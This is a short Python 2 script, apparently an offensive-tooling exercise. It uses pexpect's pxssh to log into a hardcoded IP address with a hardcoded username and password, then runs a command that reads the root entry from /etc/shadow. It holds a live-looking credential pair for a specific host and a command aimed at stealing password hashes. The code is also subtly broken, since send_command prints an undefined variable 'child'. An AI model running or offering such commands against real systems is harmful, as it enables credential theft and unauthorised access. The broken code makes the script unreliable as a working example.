# coding:utf-8
__author__ = 'maynard'

from pexpect import pxssh
def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print child.before

def connect(host,user,password):
    try:
        s = pxssh.pxssh()
        s.login(host,user,password)
        return s
    except:
        print '[-] Error Connecting'
        exit(0)

def main():
    host = '123.57.1.116'
    user='work'
    password='CpPZvpmHFHVQ'
    s= connect(host,user,password)
    send_command(s, 'cat /etc/shadow | grep root')

if __name__ == '__main__':
    main()
